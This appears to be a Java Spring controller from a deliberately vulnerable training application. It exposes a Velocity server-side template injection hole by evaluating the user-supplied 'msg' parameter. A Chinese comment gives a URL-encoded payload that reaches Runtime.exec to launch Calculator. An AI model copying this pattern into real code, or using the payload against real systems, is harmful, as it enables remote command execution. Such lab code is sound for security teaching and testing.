package com.example.vulnerablejava.controller;

import java.io.StringWriter;

import org.apache.velocity.VelocityContext;
import org.apache.velocity.app.Velocity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import io.swagger.annotations.Api;
import io.swagger.annotations.ApiOperation;

@Api(tags = "Velocity漏洞")
@RestController
@RequestMapping("velocity")
public class VelocityController {
    /**
     * 存在Velocity SSTI漏洞
     * 攻击者传入如下代码即可执行命令
     * ?msg=%23set(%24e%3D666)%3B%24e.getClass().forName("java.lang.Runtime").getMethod("getRuntime"%2Cnull).invoke(null%2Cnull).exec("open%20-a%20Calculator.app")
     */
    @ApiOperation("存在Velocity SSTI漏洞")
    @GetMapping("1")
    public String velocity1(String msg) {
        VelocityContext context = new VelocityContext();
        context.put("key", "value");
        StringWriter writer = new StringWriter();
        Velocity.evaluate(context, writer, "", msg);
        return writer.toString();
    }
}